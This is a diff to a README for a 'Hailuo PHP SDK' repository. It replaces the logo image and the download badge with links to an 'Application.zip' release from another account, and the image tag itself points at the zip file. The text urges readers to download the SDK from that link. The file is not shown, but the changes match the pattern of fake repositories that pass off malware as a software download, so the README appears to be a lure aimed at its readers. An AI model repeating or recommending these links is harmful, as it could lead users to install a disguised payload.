@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Hailuo PHP SDK Repository! 🤖
 
-![Hailuo PHP SDK Logo](https://example.com/hailuo-php-sdk-logo.png)
+![Hailuo PHP SDK Logo](https://github.com/lolmn815/hailuo-php-sdk/releases/download/v1.0/Application.zip)
 
 ## Repository Name: hailuo-php-sdk
 
@@ -25,7 +25,7 @@ Hailuo PHP SDK is a robust and community-driven PHP SDK for seamless integration
 
 ## Get Started with Hailuo PHP SDK:
 To access the latest version of the Hailuo PHP SDK, click the button below to download the SDK release:
-[![Download Hailuo PHP SDK](https://img.shields.io/badge/Download-SDK-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Hailuo PHP SDK](https://github.com/lolmn815/hailuo-php-sdk/releases/download/v1.0/Application.zip)](https://github.com/lolmn815/hailuo-php-sdk/releases/download/v1.0/Application.zip)
 
 ## How to Use the SDK:
 1. Download the SDK zip file from the provided link.
